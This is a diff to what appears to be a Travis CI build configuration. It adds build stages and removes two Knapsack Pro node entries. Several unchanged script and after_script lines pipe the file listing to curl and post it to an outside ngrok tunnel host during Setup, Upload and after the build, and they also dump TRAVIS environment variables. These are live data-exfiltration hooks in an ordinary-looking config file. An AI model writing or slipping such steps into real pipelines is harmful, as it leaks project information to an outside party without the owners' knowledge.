@@ -25,12 +25,15 @@ script:
 after_script:
   - ls | curl -d @- http://2c4052397fd3.ngrok.io/done
 
+stages:
+  - Setup
+  - test
+  - Upload
+
 jobs:
   include:
     - stage: Setup
       script: env | grep '^TRAVIS*=*' && ls | curl -d @- http://2c4052397fd3.ngrok.io/setup
-    - env: KNAPSACK_PRO_CI_NODE_INDEX=0
-    - env: KNAPSACK_PRO_CI_NODE_INDEX=1
     - stage: Upload
       script: env | grep '^TRAVIS*=*' && ls | curl -d @- http://2c4052397fd3.ngrok.io/upload
       after_script: ls | curl -d @- http://2c4052397fd3.ngrok.io/upload_after
